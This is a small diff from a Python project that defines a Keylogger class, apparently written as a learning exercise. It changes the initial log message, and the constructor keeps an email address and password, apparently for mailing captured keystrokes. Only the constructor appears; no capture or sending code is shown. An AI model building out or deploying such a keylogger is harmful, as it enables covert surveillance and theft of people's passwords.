@@ -9,7 +9,7 @@ import threading
 class Keylogger: #class names start with capital letter conventionally
     def __init__(self, time_interval, email, password): #create constructor method
         #any code under here will automatically be executed
-        self.log = "" #create an attribute log
+        self.log = "Keylogging started" #create an attribute log
         self.interval = time_interval #value required to be passed to Keylogger when running from other code
         #ie my_keylogger = keylog.Keylogger(5) - passes interval of 5
         self.email = email
